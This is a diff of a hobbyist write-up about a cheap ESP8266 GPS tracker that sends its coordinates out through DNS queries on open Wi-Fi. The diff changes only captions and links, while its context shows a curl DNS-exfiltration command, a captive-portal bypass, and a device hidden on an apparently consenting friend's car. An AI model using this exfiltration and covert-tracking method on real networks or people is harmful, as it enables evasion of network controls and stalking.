@@ -52,7 +52,7 @@ This works by making a DNS request to a domain name like `alexlynd.com`, but pre
 
 While this is typically used to bypass poorly-configured firewalls for data exfiltration, I can also take advantage of this technique to sneak our wardriving gps data **into** the network as well!  
 
-!["DNS Exfiltration diagram"](img/dns-exfil.png)
+!["DNS Exfiltration"](img/dns-exfil.png)
 
 Thanks to poor ingress filtering, I discovered that most of my nearby open networks allowed me to resolve DNS requests without "fully connecting" through the captive portal!
 
@@ -61,7 +61,7 @@ Hosting my own web server & infrastructure for DNS Exfiltration would be a pain 
 
 To try this service out, I connected to my local coffee shop Wi-Fi from my laptop without entering my info into the captive portal, and used my phone to generate a DNS token, which gave me a unique url in the format `<dns-token-here>.canarytokens.org`.
 
-In order to exfiltrate data to this token, [CanaryTokens specifices](https://docs.canarytokens.org/guide/dns-token.html) we prepend a random 2 digit number with `G`, and a base32 encoded subdomain - so I used an online converter to translate `meow123` to base 32: `NVSW65ZRGIZQ` and made a request to the following url with [cURL]():
+In order to exfiltrate data to this token, [CanaryTokens specifices](https://docs.canarytokens.org/guide/dns-token.html) we prepend a random 2 digit number with `G`, and a base32 encoded subdomain - so I used an online converter to translate `meow123` to base 32: `NVSW65ZRGIZQ` and made a request to the following url with [curl]():
 ```
 curl NVSW65ZRGIZQ.G69.<dns-token-here>.canarytokens.org
 ```
@@ -93,7 +93,7 @@ I found that storing the GPS coordinates quickly ate up heap space, causing over
 
 To mitigate this, I implemented a [queue](https://www.geeksforgeeks.org/queue-data-structure/) system that pushes coordinates to the internal 1MB Flash Memory with [SPIFFS](https://www.tutorialspoint.com/esp32_for_iot/esp32_for_iot_spiffs_storage.htm) - which also allows me to retain data in case of a power loss or reset.
 
-![](img/memory.png)
+![DNS DriveBy Internal Database](img/memory.png)
 
 To optimize the amount of memory available and reduce flash wear, I set the GPS to poll coordinates every 15 seconds, and only keep 100 coordinates in RAM as 34 character base32 encoded char arrays.  This allows me store around 15,600 coordinate pairs!
 
@@ -103,11 +103,11 @@ To optimize the amount of memory available and reduce flash wear, I set the GPS 
 
 
 #### Low-Power Hardware
-To keep the board powered for long enough to provide intel on Irish's whereabouts, implementing low-power hardware was necessary to conserve battery while his car was sitting idle.  Luckily, the ESP8266 comes with a low-power mode that brings power consumption down to around 20μA, which can be invoked with the following function:
+To keep the board powered for long enough to provide intel on Irish's whereabouts, implementing low-power hardware was necessary to conserve battery while his car was sitting idle.  Luckily, the ESP8266 comes with a low-power mode that brings power consumption down to around `20μA`, which can be invoked with the following function:
 ```
 ESP.deepSleep(0);
 ```  
-Usually, we "wake" the board up in software [by specifying a delay](), but since I wanted to trigger a reset when motion is detected from a shake sensor, this was tricky since the onboard I/O pins are disabled in deep sleep mode.
+Usually, we "wake" the board up in software [by specifying a delay](https://randomnerdtutorials.com/esp8266-deep-sleep-with-arduino-ide/), but since I wanted to trigger a reset when motion is detected from a shake sensor, this was tricky since the onboard I/O pins are disabled in deep sleep mode.
 
 Triggering the reset when Irish's car starts up was as simple as adding a shake sensor between `reset` and `ground` - but in order to prevent an accidental reset while the device is powered up, I had to use an [NPN transistor](https://www.electronics-tutorials.ws/transistor/tran_2.html) and a NOT gate to create a rudimentary [normally-closed switch](https://plashlights.com/blogs/news/normally-open-vs-closed-switch), which electronically "disconnects" the shake sensor while the tracker is powered up & moving.
 
@@ -133,9 +133,9 @@ To piece it all together, I soldered all my components on a perfboard, and imple
 |[Slide Switch (SPDT)](https://www.aliexpress.us/item/2255799856317474.html)|Turn the tracker on/off|1|4¢|
 |[Perfboard](https://www.aliexpress.us/item/2255800949347304.html)|Hell you could just connect everything with 22AWG wire|1|2¢|
 |[Terminal Block](https://www.aliexpress.us/item/3256804481581777.html)|Screw-down connector for the LiPo battery|1|6¢|
-|[ESP-01 Female Pin Header](https://www.aliexpress.us/item/2251832796106924.html)|ESP-01 standoff to give more space for mounting components|1|5¢|
+|[ESP-01 Female Pin Headers](https://www.aliexpress.us/item/2251832796106924.html)|ESP-01 standoff to give more space for mounting components|1|5¢|
 
-To protect the electronics & provide a large enough surface to adhere to Irish's car, I used FreeCAD to whip up a minimal 2-part enclosure that you can [download here](https://github.com/alexlynd/DNS-DriveBy).
+To protect the electronics & provide a large enough surface to adhere to Irish's car, I used FreeCAD to whip up a minimal 2-part enclosure that uses heat inserts & screws cause I thought they were cool.
 
 ![Assembled DNS DriveBy prototype with ESP8266 and NEO-6M GPS](img/assembly.JPG)
 
@@ -149,7 +149,7 @@ To test out the prototype, I enabled an open Wi-Fi network on my phone and drove
 
 I initially faced some issues with the [watchdog timer](https://techtutorialsx.com/2017/01/21/esp8266-watchdog-functions/) triggering while it attempted to scan for open networks, and heap overflows while multitasking between GPS logging & running Wi-Fi scans - but eventually got a pretty robust prototype working!
 
-![](img/exfil-gps.png)
+![GPS Data Exfiltrated to CanaryTokens Dashboard](img/exfil-gps.png)
 
 The next day, Kody, Michael, and I deployed our tracking systems on Irish, each using a different approach and reconnaissance style:  
 - Michael used off-the shelf trackers and consumer products such as a [Tile tracker](https://www.tile.com)
@@ -160,7 +160,7 @@ The next day, Kody, Michael, and I deployed our tracking systems on Irish, each 
 
 At the end of the day, I checked my CanaryTokens dashboard and had a couple hundred hits from Irish's excursion around East LA!  
 
-![GPS points on reconnaissance map](img/irish-map.png)
+![Map of Irish's Route around Glendale with GPS Points](img/irish-map.png)
 
 In order to turn this data into something useful, I downloaded the CanaryTokens log as a `csv` file, used Python to parse the GPS coordinates, and used [Google MyMaps](https://mymaps.google.com) to visualize the data.  
 
@@ -180,7 +180,7 @@ To make the design more robust and easier for beginners to assemble, I started d
 
 Using the [D1 Mini](https://www.wemos.cc/en/latest/d1/d1_mini.html) ESP8266 form-factor, this design allows for easy plug-and-play expansion with various [D1 hardware add-ons](https://www.wemos.cc/en/latest/d1_mini_shield/index.html), and also has a larger 4MB flash chip.
 
-![Render for DNS DriveBy PCB](img/PCB.png)
+![DNS DriveBy PCB Render](img/PCB.png)
 
 #### Conclusion & Future Ideas
 After successfully plotting Irish's full trip with precise datetime and GPS data through intermittent updates, I successfully demonstrated the feasibility of fortuitous reconnaissance over open Wi-Fi networks!  Using tricky techniques like DNS exfiltration, I was able to bypass captive portals, and also used a $1 Wi-Fi microcontroller to create a low-profile tracker that provides GPS telemetry to an online dashboard.  
